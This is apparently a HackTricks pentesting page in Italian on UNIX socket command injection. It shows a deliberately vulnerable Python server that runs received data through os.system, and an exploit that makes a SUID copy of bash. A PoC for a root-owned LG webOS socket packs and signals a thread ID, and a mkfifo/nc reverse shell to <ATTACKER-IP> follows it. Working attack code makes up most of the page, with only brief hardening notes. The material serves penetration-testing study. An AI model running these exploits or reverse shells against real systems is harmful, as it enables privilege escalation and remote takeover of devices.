# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

Nel seguente esempio viene creato un **unix socket** (`/tmp/socket_test.s`) e tutto ciò che viene **ricevuto** verrà **eseguito** da `os.system`. So che non lo troverai nel mondo reale, ma l'obiettivo di questo esempio è mostrare com'è fatto un codice che usa unix sockets e come gestire l'input nel peggior caso possibile.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Esegui** il codice usando python: `python s.py` e **controlla come la socket è in ascolto**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Caso di studio: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Alcuni daemon privilegiati espongono un root-owned UNIX socket che accetta input non attendibili e associa azioni privilegiate a thread-IDs e signals. Se il protocollo permette a un unprivileged client di influenzare quale native thread venga preso di mira, potresti riuscire a innescare un privileged code path e ottenere escalation.

Observed pattern:
- Connettiti a un root-owned socket (es., /tmp/remotelogger).
- Crea un thread e ottieni il suo native thread id (TID).
- Invia il TID (packed) più padding come request; ricevi un acknowledgement.
- Invia uno specifico signal a quel TID per triggerare il privileged behaviour.

Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Per trasformare questo in una shell root, può essere usato un semplice pattern named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Note:
- Questa classe di bug nasce dal fidarsi di valori derivati dallo stato del client non privilegiato (TIDs) e dal legarli a signal handlers o a logiche privilegiate.
- Rafforzare applicando il controllo delle credenziali sul socket, validando i formati dei messaggi e disaccoppiando le operazioni privilegiate dagli identificatori di thread forniti esternamente.

## References

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
